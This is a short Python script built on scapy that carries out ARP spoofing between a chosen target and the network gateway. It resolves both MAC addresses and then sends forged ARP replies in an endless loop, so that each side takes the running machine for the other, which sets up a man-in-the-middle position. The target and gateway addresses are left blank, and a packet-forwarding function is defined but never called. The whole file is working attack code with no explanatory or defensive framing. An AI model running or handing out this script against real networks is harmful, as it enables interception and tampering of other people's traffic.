from time import sleep
import scapy.all as scapy

gateway = ""
target_ip = ""


def get_mac(ip):
    ans, _ = scapy.srp(scapy.Ether(dst='ff:ff:ff:ff:ff:ff') /
                       scapy.ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src
    else:
        raise ValueError("unable to to find mac address")


def forward(packet):
    scapy.send(packet, verbose=0)
    print(packet.summary())


target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway)

print(target_mac)
print(gateway_mac)


while True:
    scapy.send(scapy.ARP(op='is-at', psrc=gateway,
                         pdst=target_ip, hwdst=target_mac), verbose=0)
    scapy.send(scapy.ARP(op='is-at', psrc=target_ip,
                         pdst=gateway, hwdst=gateway_mac), verbose=0)
    sleep(1)
